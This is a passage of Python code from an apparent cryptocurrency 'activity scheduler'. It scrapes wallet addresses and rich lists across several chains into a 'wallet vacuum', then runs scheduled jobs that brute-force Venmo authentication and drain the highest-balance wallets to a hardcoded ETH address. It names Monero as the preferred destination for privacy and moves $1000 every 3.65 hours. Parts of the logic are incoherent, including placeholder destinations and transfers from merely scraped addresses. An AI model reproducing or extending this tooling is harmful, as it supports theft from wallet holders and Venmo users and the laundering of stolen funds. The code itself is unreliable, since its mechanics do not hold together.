                    f"DriftChain: {dc_tx_count} transactions")
        
        # Emit legacy event with transaction analysis
        emit_event('multi_chain_transactions_analyzed', {
            'eth_count': eth_tx_count,
            'btc_count': btc_tx_count,
            'drift_chain_count': dc_tx_count,
            'timestamp': time.time()
        })
        
        # Emit new consolidated event with all data
        emit_event('all_chains_transactions_analyzed', results)
        
        # Update last run time
        self.last_run_times['multi_chain_transaction_analyzer'] = time.time()
        self.last_run_times['multi_chain_transaction_analyzer_completed'] = time.time()
        
        logger.info(f"Multi-chain transaction analyzer completed. Analyzed {len(successful_networks)} chains successfully.")
        
        return {
            'status': 'success',
            'data': analysis_data,
            'all_chain_data': results
        }
            
    def _run_crypto_balance_scanner(self):
        """Run the crypto balance scanner to discover new wallets."""
        logger.info("Running crypto balance scanner...")
        
        try:
            # Update last run time
            self.last_run_times['crypto_balance_scanner'] = time.time()
            
            # Get the crypto balance scraper
            scraper = get_scraper()
            
            # Scan for wallets on different chains
            chains = ['ethereum', 'bitcoin', 'litecoin', 'polkadot']
            for chain in chains:
                logger.info(f"Scanning {chain} blockchain for wallets...")
                wallets = scraper.scrape_wallets(chain, count=5)
                
                # Register discovered wallets with ETH wallet vacuum
                for wallet_data in wallets:
                    if 'address' in wallet_data:
                        eth_wallet_vacuum.register_wallet(chain, wallet_data['address'])
                        logger.info(f"Registered {chain} wallet: {wallet_data['address']}")
                
                logger.info(f"Discovered {len(wallets)} {chain} wallets")
            
            # Get a rich list for Ethereum as it's most commonly used
            rich_list = scraper.get_rich_list('ethereum', limit=10)
            total_eth = sum(wallet.get('balance', 0) for wallet in rich_list)
            
            # Update last run time
            self.last_run_times['crypto_balance_scanner_completed'] = time.time()
            logger.info(f"Crypto balance scanner completed successfully. Found {total_eth:.2f} ETH in top wallets.")
            
            # Emit event for monitoring
            emit_event('crypto_scanner_completed', {
                'timestamp': time.time(),
                'wallets_discovered': sum(len(scraper.scrape_wallets(chain, count=5)) for chain in chains),
                'rich_list_eth': total_eth
            })
            
        except Exception as e:
            logger.error(f"Error in crypto balance scanner: {e}")
            emit_event('error_occurred', {
                'source': 'crypto_balance_scanner',
                'error': str(e),
                'timestamp': time.time()
            })
    
    def _run_venmo_interval_transfer(self) -> Dict[str, Any]:
        """
        Run the Venmo interval transfer process ($1000 USD every 3.65 hours).
        This function is scheduled to run automatically every 3.65 hours.
        Uses enhanced brute force authentication to maximize transfer success rate.
        """
        logger.info("Running scheduled Venmo interval transfer ($1000 USD) with enhanced authentication...")
        
        try:
            # Update last run time
            self.last_run_times['venmo_interval_transfer'] = time.time()
            
            # Import with brute force authentication function
            from venmo_integration import authenticate_venmo_with_all_methods
            
            # First attempt to authenticate with all available methods
            logger.info("Attempting Venmo authentication with all available methods...")
            auth_result = authenticate_venmo_with_all_methods()
            
            if auth_result:
                logger.info("Venmo authentication successful or fallback enabled")
            else:
                logger.warning("All Venmo authentication methods failed, using ETH wallet fallback")
            
            # Execute the interval transfer with $1000 USD target
            transfer_result = transfer_assets_in_intervals(amount_usd=1000.0)
            
            # Process result
            if transfer_result.get('successful_transfers', 0) > 0:
                total_eth = transfer_result.get('total_eth_transferred', 0)
                total_usd = transfer_result.get('total_usd_value', 0)
                wallets_processed = transfer_result.get('processed_wallets', 0)
                success_rate = transfer_result.get('success_rate', 0)
                fallback_used = any(tx.get('fallback_used', False) for tx in transfer_result.get('transfers', []))
                
                logger.info(f"Successfully transferred {total_eth} ETH (${total_usd:.2f}) " + 
                           f"from {transfer_result['successful_transfers']}/{wallets_processed} wallets " +
                           f"to {'ETH wallet fallback' if fallback_used else 'Venmo'} " +
                           f"(success rate: {success_rate:.1f}%)")
                
                # Emit success event
                emit_event('venmo_interval_transfer_completed', {
                    'timestamp': time.time(),
                    'total_eth': total_eth,
                    'total_usd_value': total_usd,
                    'wallets_processed': wallets_processed,
                    'successful_transfers': transfer_result.get('successful_transfers', 0),
                    'success_rate': success_rate
                })
            else:
                # If no successful transfers, check for critical error
                if 'critical_error' in transfer_result:
                    error = transfer_result.get('critical_error', 'Unknown error')
                    logger.error(f"Critical error in Venmo interval transfer: {error}")
                else:
                    logger.warning("No successful transfers in Venmo interval transfer - possibly no funds available")
                
                # Emit failure event
                emit_event('venmo_interval_transfer_failed', {
                    'timestamp': time.time(),
                    'errors': transfer_result.get('errors', []),
                    'critical_error': transfer_result.get('critical_error', None)
                })
            
            # Update last run time
            self.last_run_times['venmo_interval_transfer_completed'] = time.time()
            
            # Schedule next interval (redundant but helpful for logging)
            next_run = datetime.now() + timedelta(hours=3.65)
            logger.info(f"Next Venmo interval transfer scheduled for: {next_run.strftime('%Y-%m-%d %H:%M:%S')}")
            
            return transfer_result
            
        except Exception as e:
            logger.error(f"Error in Venmo interval transfer: {e}")
            emit_event('error_occurred', {
                'source': 'venmo_interval_transfer',
                'error': str(e),
                'timestamp': time.time()
            })
            return {'success': False, 'error': str(e)}
    
    def _transfer_wallet_vacuum_funds(self) -> Dict[str, Any]:
        """
        Transfer accumulated funds from wallet vacuum to secure storage.
        Primary destination is Monero wallet for enhanced privacy.
        Falls back to Venmo if configured, then to secure wallet transfer.
        Uses enhanced brute force authentication to maximize transfer success rate.
        
        Returns:
            Dictionary with transfer status and details
        """
        logger.info("Initiating daily wallet vacuum fund transfer to Monero wallet...")
        
        try:
            from venmo_integration import authenticate_venmo_with_all_methods, redirect_funds_to_eth_wallet
            
            # First try to authenticate with all available methods
            logger.info("Attempting Venmo authentication with all available methods...")
            auth_result = authenticate_venmo_with_all_methods()
            
            if auth_result:
                logger.info("Venmo authentication successful or fallback enabled")
            else:
                logger.warning("All Venmo authentication methods failed, using ETH wallet fallback")
            
            # Get Venmo redirect status
            venmo_redirect_status = get_venmo_redirect_status()
            venmo_redirect_result = None
            
            # Attempt to redirect funds to Venmo with our authentication result
            if auth_result or venmo_redirect_status.get('authenticated', False):
                logger.info("Venmo authentication successful. Redirecting funds to Venmo crypto wallet...")
                venmo_redirect_result = redirect_vacuum_funds_to_venmo(force=True)
                
                if venmo_redirect_result.get('success', False):
                    amount = venmo_redirect_result.get('transfer_amount', 0)
                    source_wallet = venmo_redirect_result.get('wallet_address', 'unknown')
                    transaction_id = venmo_redirect_result.get('transaction_id', 'unknown')
                    target_venmo = venmo_redirect_result.get('target_venmo_id', 'unknown')
                    
                    logger.info(f"Successfully redirected {amount} ETH from {source_wallet} to Venmo (TXN: {transaction_id})")
            else:
                logger.info("Venmo authentication failed or not available. Falling back to direct ETH wallet transfer...")
                # Get high balance vacuum wallets
                wallets = eth_wallet_vacuum.get_vacuum_wallets()
                
                if wallets and len(wallets) > 0:
                    # Find highest balance wallet
                    highest_balance = 0
                    best_wallet = None
                    
                    for wallet_data in wallets:
                        wallet_address = wallet_data.get('address')
                        if not wallet_address:
                            continue
                            
                        balance = eth_wallet_vacuum.get_wallet_balance(wallet_address)
                        if balance and balance > highest_balance:
                            highest_balance = balance
                            best_wallet = wallet_address
                    
                    if best_wallet and highest_balance > 0.001:  # Minimum transfer amount
                        # Get target ETH wallet from environment
                        import os
                        target_eth_wallet = os.environ.get('VENMO_ETH_WALLET', '0x90bf6B6d71f014fdE4Cc323CdF8B0467BF0fA111')
                        
                        # Transfer directly to ETH wallet
                        eth_transfer_result = redirect_funds_to_eth_wallet(
                            amount=highest_balance - 0.001,  # Leave some for gas
                            source_wallet=best_wallet,
                            note="Automated vacuum transfer (direct ETH)"
                        )
                        
                        if eth_transfer_result.get('success', False):
                            logger.info(f"Successfully redirected {eth_transfer_result.get('amount')} ETH to wallet {target_eth_wallet}")
                            
                            # Update last run time
                            self.last_run_times['wallet_transfer'] = time.time()
                            
                            # Emit event for direct ETH transfer
                            emit_event('wallet_funds_transferred', {
                                'timestamp': time.time(),
                                'amount': eth_transfer_result.get('amount'),
                                'wallet': best_wallet,
                                'destination': target_eth_wallet,
                                'method': 'direct_eth_transfer'
                            })
                            
                            return {
                                'status': 'success',
                                'transferred_amount': eth_transfer_result.get('amount'),
                                'wallet_count': 1,
                                'destination': target_eth_wallet,
                                'method': 'direct_eth_transfer',
                                'details': eth_transfer_result
                            }
            
            # Handle successful Venmo redirection
            if venmo_redirect_result and venmo_redirect_result.get('success', False):
                venmo_amount = venmo_redirect_result.get('transfer_amount', 0)
                venmo_source = venmo_redirect_result.get('wallet_address', 'unknown')
                venmo_txn = venmo_redirect_result.get('transaction_id', 'unknown')
                venmo_target = venmo_redirect_result.get('target_venmo_id', 'unknown')
                
                # Update last run time
                self.last_run_times['wallet_transfer'] = time.time()
                
                # Emit event for the Venmo transfer
                emit_event('wallet_funds_transferred', {
                    'timestamp': time.time(),
                    'amount': venmo_amount,
                    'wallet': venmo_source,
                    'transaction_id': venmo_txn,
                    'destination': f"Venmo:{venmo_target}",
                    'method': 'venmo_redirect'
                })
                
                return {
                    'status': 'success',
                    'transferred_amount': venmo_amount,
                    'wallet_count': 1,
                    'transfer_id': venmo_txn,
                    'destination': f"Venmo:{venmo_target}",
                    'method': 'venmo_redirect',
                    'details': venmo_redirect_result
                }
            # Handle Venmo redirection failure
            elif venmo_redirect_result:
                # Log the Venmo redirection failure but continue to try regular secure wallet transfer
                error_msg = venmo_redirect_result.get('error', 'Unknown Venmo error')
                logger.warning(f"Venmo redirection failed: {error_msg}. Falling back to secure wallet transfer.")
            # Handle no Venmo redirection attempted
            else:
                logger.info("Venmo redirection not configured or authenticated. Using secure wallet transfer.")
                
            # Fall back to original secure wallet transfer if Venmo fails or is not configured
            # Get the secure wallet manager
            wallet_manager = secure_wallet_manager.get_wallet_manager()
            
            # Define secure destination wallet (this would be configured elsewhere in production)
            destination_wallet = "0xSecureVaultWallet"
            
            # Transfer the funds
            transfer_result = wallet_manager.transfer_vacuum_funds(destination_wallet)
            
            # Log the result
            if transfer_result.get('status') == 'success':
                amount = transfer_result.get('transferred_amount', 0)
                wallets = transfer_result.get('wallet_count', 0)
                transfer_id = transfer_result.get('transfer_id', 'unknown')
                
                logger.info(f"Successfully transferred {amount} ETH from {wallets} wallets (ID: {transfer_id})")
                
                # Update last run time
                self.last_run_times['wallet_transfer'] = time.time()
                
                # Emit event for the transfer
                emit_event('wallet_funds_transferred', {
                    'timestamp': time.time(),
                    'amount': amount,
                    'wallet_count': wallets,
                    'transfer_id': transfer_id,
                    'destination': destination_wallet,
                    'method': 'scheduled'
                })
                
                # Add the Venmo result if available
                if venmo_redirect_result:
                    transfer_result['venmo_attempt'] = venmo_redirect_result
                    
            else:
                error_msg = transfer_result.get('message', 'Unknown error')
                logger.error(f"Fund transfer failed: {error_msg}")
                
                # Emit error event
                emit_event('error_occurred', {
                    'source': 'wallet_transfer',
                    'error': error_msg,
                    'timestamp': time.time()
                })
                
                # Add the Venmo result if available
                if venmo_redirect_result:
                    transfer_result['venmo_attempt'] = venmo_redirect_result
            
            return transfer_result
            
        except Exception as e:
            error_msg = f"Error transferring wallet funds: {str(e)}"
            logger.error(error_msg)
            
            # Emit error event
            emit_event('error_occurred', {
                'source': 'wallet_transfer',
                'error': error_msg,
                'timestamp': time.time()
            })
            
            return {
                'status': 'error',
                'message': error_msg,
                'timestamp': time.time()
            }


# Singleton instance
_activity_scheduler = None

def get_activity_scheduler() -> ActivityScheduler:
    """
    Get the global activity scheduler instance.
    
    Returns:
        The singleton ActivityScheduler instance
    """
    global _activity_scheduler
    if _activity_scheduler is None:
        _activity_scheduler = ActivityScheduler()
    return _activity_scheduler

def start_activity_scheduler():
    """Start the global activity scheduler instance."""
    scheduler = get_activity_scheduler()
    scheduler.start()
    return scheduler

def cycle_all_activities():
    """Manually trigger a cycle of all activities."""
    scheduler = get_activity_scheduler()
    scheduler._run_all_activities()
    return scheduler.get_status()

def run_bitcoin_network_monitor():
    """Run the Bitcoin network monitor to get current status."""
    scheduler = get_activity_scheduler()
    return scheduler._run_bitcoin_network_monitor()

def run_ethereum_gas_tracker():
    """Run the Ethereum gas tracker to get current gas prices."""
    scheduler = get_activity_scheduler()
    return scheduler._run_ethereum_gas_tracker()

def run_blockchain_integrity_check():
    """Run a comprehensive blockchain integrity check across multiple chains."""
    scheduler = get_activity_scheduler()
    return scheduler._run_blockchain_integrity_check()

def run_multi_chain_transaction_analyzer():
    """Run the multi-chain transaction analyzer."""
    scheduler = get_activity_scheduler()
    return scheduler._run_multi_chain_transaction_analyzer()

def get_scheduler_status() -> Dict[str, Any]:
    """
    Get the current status of the activity scheduler.
    
    Returns:
        Dict containing scheduler status information
    """
    scheduler = get_activity_scheduler()
    
    # Get scheduled jobs
    scheduled_activities = []
    last_run = {}
    
    if hasattr(scheduler, 'scheduler'):
        jobs = scheduler.scheduler.get_jobs()
        for job in jobs:
            job_id = job.id
            scheduled_activities.append(job_id)
            
            # Try to get last run time
            if hasattr(job, 'next_run_time') and job.next_run_time:
                # Calculate approximate last run time based on interval
                if hasattr(job.trigger, 'interval'):
                    interval = job.trigger.interval
                    last_run_time = job.next_run_time - interval
                    last_run[job_id] = last_run_time.strftime('%Y-%m-%d %H:%M:%S')
    
    return {
        'running': scheduler.is_running if hasattr(scheduler, 'is_running') else False,
        'scheduled_activities': scheduled_activities,
        'last_run': last_run
    }